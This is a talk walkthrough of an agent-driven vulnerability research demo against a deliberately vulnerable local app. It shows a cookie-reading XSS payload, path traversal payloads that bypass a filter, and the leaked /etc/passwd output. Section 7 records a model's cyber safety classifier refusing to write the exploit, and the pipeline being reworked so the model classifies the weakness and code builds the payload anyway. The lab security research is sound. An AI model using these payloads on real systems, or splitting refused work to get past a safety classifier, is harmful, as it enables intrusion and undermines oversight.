# VulnTarget — Autonomous Vulnerability Research Demo (Walkthrough)

*A self-contained review document for the OWASP talk “Autonomous Vulnerability Research:
Bridging SAST, DAST and Human Expertise.” It describes the whole pipeline and the actual
verified results — no need to read the source package.*

---

## 1. The thesis

A SAST tool reads source and flags a **potential** vulnerability. A standard DAST scan,
run the way most people run it, **misses** that same vulnerability — because it can't
discover the route, can't authenticate, or can't get past an input filter. An **agent**,
given the SAST finding plus source context, does what neither tool does alone: it resolves
the route and auth from source, delivers a payload, and **proves** the bug with a
browser-confirmed PoC.

> SAST raises the lead → DAST alone can't reach it → the agent bridges the gap into a proof.

Everything below runs locally as a set of one-shot Docker containers against a deliberately
vulnerable demo app (“VulnTarget”).

---

## 2. The pipeline at a glance

| Stage | Tool | Runs as | Produces |
|---|---|---|---|
| Static intake | **OpenGrep** (SAST) | container | `findings.json` + a readable “potential vuln” banner |
| Dynamic scan | **OWASP ZAP** (DAST) | container (3 tiers) | HTML/JSON reports showing what DAST can and can't reach |
| Validation | **Agent** (Node + Playwright) | container | browser-confirmed XSS PoC |
| Exploitation | **Agent + LLM** (Claude) | container | filter-bypass path-traversal PoC |

---

## 3. The target app (VulnTarget)

A small internal “security bug-reporting portal” (Node/Express + SQLite). Login-gated;
dark UI; realistic seed data. It carries a deliberate spread of vulnerabilities at
different difficulties, so SAST and DAST produce *different* detection profiles:

| Vuln | Route | Linked in UI? | SAST finds | DAST (standard) finds | Difficulty |
|---|---|---|---|---|---|
| Reflected XSS | `GET /search?q=` | **No** (hidden) | ✅ | ❌ (never discovered) | Hard — needs agent |
| Stored XSS | comment / profile name | Yes | ❌ (custom render) | ✅ | Easy |
| SQL injection | `GET /filter?status=` | Yes | ✅ | ✅ | Easy |
| HTML injection | `GET /preview?html=` | **No** (hidden) | ✅ | ❌ (never discovered) | Hard — needs agent |
| Path traversal | `GET /attachment?file=` | Yes | ✅ | ✅ | Medium |
| Path traversal **(filtered)** | `GET /download?file=` | Yes | ✅ | ❌ (filter blocks fuzz) | Hard — needs agent to craft a bypass |

The two hidden routes and the filtered endpoint are the payoffs: SAST sees them in source,
a standard DAST crawl cannot.

---

## 4. Stage 1 — SAST (OpenGrep)

A one-shot container runs OpenGrep with a small set of **deterministic** custom rules
(so the findings fire every time, offline, no rule-registry dependency). It prints a
demo-friendly summary and writes `findings.json` for the agent.

**Actual output (abridged):**

```
  [!]  5 POTENTIAL VULNERABILITY(IES) FOUND   —   SAST / opengrep

  POTENTIAL VULN  : opengrep-rules.vuln-target-express-reflected-xss
  severity        : HIGH  (opengrep rule severity: ERROR)
  confidence      : HIGH
  file            : routes/search.js
  line            : 18-30
  cwe             : CWE-79: ... Cross-site Scripting ...
  code            :
      |   res.send(`... <h2>Results for: ${q}</h2> ...`)
  (unconfirmed — needs a PoC. Full machine-readable output -> out/findings.json)
```

The five findings: reflected XSS (`/search`), SQLi (`/filter`), HTML injection
(`/preview`), and path traversal on both `/attachment` and the filtered `/download`.
Each is tagged **unconfirmed — needs a PoC**, which sets up the agent stage.

---

## 5. Stage 2 — DAST (OWASP ZAP), three tiers

ZAP runs authenticated against the app. Three tiers make the contrast explicit:

| Tier | What ZAP does | `/search` reflected XSS | Stored XSS | SQLi `/filter` | Traversal `/attachment` | Filtered `/download` |
|---|---|---|---|---|---|---|
| **1 — no creds** | can't get past login | ❌ | ❌ | ❌ | ❌ | ❌ |
| **2 — authenticated** | crawls nav links, active-scans | **❌ (hidden)** | ✅ | ✅ | ✅ | **❌ (filter blocks fuzz)** |
| **3 — auth + agent-supplied route** | given `/search` from source | **✅** | ✅ | ✅ | ✅ | — |

**The money rows:** an authenticated ZAP scan finds the linked bugs on its own (stored XSS,
SQLi, the unguarded traversal) but **never reaches the hidden `/search`** and **can't fuzz
past `/download`'s filter**. Hand it the source-derived route (Tier 3) and it confirms the
reflected XSS. That gap is exactly what the agent fills.

---

## 6. Stage 3 — Validation agent (reflected XSS)

A Node + Playwright container. It ingests **both** scan outputs, then:

1. reads the OpenGrep finding (sink + parameter),
2. resolves `routes/search.js` → `GET /search`, param `q`, `requireAuth` **from source**,
   and even pulls a working login (`alice`) from the seed file,
3. cross-references the ZAP report to confirm DAST never reached `/search`,
4. authenticates in a real headless browser, delivers the payload, and confirms
   **execution** (not just reflection) via the page title changing,
5. replays a benign control, and writes the PoC.

**Actual run:**

```
[agent] resolve  GET /search  param=q  authRequired=true
[agent] dast     DAST did NOT reach /search — gap confirmed
[agent] auth     logged in -> /dashboard
[agent] exploit  title="XSS-CONFIRMED-connect.sid=s%3A..."  executed=true
[agent] control  title="Search · VulnTarget"  clean=true
[agent] poc      validated=true
```

The tab title became `XSS-CONFIRMED-<session cookie>` — the injected script ran **and**
read `document.cookie`. That's execution, confirmed in a browser; the benign control stays
clean, ruling out a false positive. **No human wrote the exploit URL** — the agent derived
it from the SAST finding plus source context.

---

## 7. Stage 4 — Exploitation agent (filtered path traversal + LLM)

The showcase for agent *reasoning past a defense*. `GET /download?file=` has a safeguard:

```js
const safe = requested.replace(/\.\.\//g, '');   // strip "../" — but only ONE pass
```

That blocks obvious payloads (`../../../../etc/passwd` → stripped) and a plain DAST fuzz.
SAST still flags it; a scanner can't prove it. The agent:

1. reads the handler **and its filter**,
2. asks **Claude** to review it,
3. turns the model's diagnosis into a concrete payload **in code**,
4. delivers it authenticated and confirms the `/etc/passwd` leak, with the naive (blocked)
   payload and a benign file as controls.

### The honest finding worth putting on a slide

Asked to **write the exploit payload directly**, the current frontier models **refuse**:

```
stop_reason: refusal   category: cyber
"This request triggered restrictions on violative cyber content and was blocked
 under Anthropic's Usage Policy."
```

Both Opus 5.5 and Sonnet 5.5 refused identically — it's a family-wide safety classifier,
not a model quirk, and swapping models doesn't evade it. **So the architecture adapts:** the
model does the *defensive* work it's willing to do — classify the weakness — and the agent
*weaponizes in code*. This is a more honest and more interesting story than “the AI wrote
the exploit.”

**Actual run (reframed, on `claude-opus-4-8`):**

```
[agent] control  naive ../../../../etc/passwd -> leak=false (safeguard holds)
[agent] assess   vulnerable — weakness: non_recursive_strip
[agent] assess   "A single non-recursive replace ... allows overlapping patterns to
                  collapse back into traversal sequences after filtering ..."
[agent] craft    code built 5 candidate payloads for class "non_recursive_strip"
[agent] exploit  payload "....//....//....//....//....//....//....//....//etc/passwd" -> leak=true
[agent] poc      exploited=true
```

The model even recommended the correct fix (`path.resolve` + verify the path stays within
the uploads directory). Leaked evidence:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

## 8. What to take to the stage

- **SAST and DAST have different blind spots.** SAST sees hidden/filtered sinks in source;
  a standard DAST run misses them (discovery, auth, or a filter). We proved both directions.
- **The agent is the bridge.** It turns a SAST *lead* into a DAST-style *proof* — resolving
  route/auth from source, authenticating, and confirming execution in a real browser.
- **Reasoning beats a payload list.** Against a filtered endpoint, a scanner's fixed fuzz
  fails; the agent reasons about the defense and engineers around it.
- **Alignment is a design constraint, not a blocker.** Frontier models refuse to hand over a
  weaponized exploit (`cyber` policy). The workable pattern: LLM diagnoses, code weaponizes.

---

## 9. Reproducibility (for the reviewer’s awareness)

Everything is containerized and runs from `docker compose` against a local app on
`:3000`. The full operator runbook (every command, the three ZAP tiers, both agents, the
`.env` for the LLM key) lives in `RUNBOOK.md`; the intentional-vulnerability catalog lives
in `VULN.md`. All results above were produced live during build, not mocked.
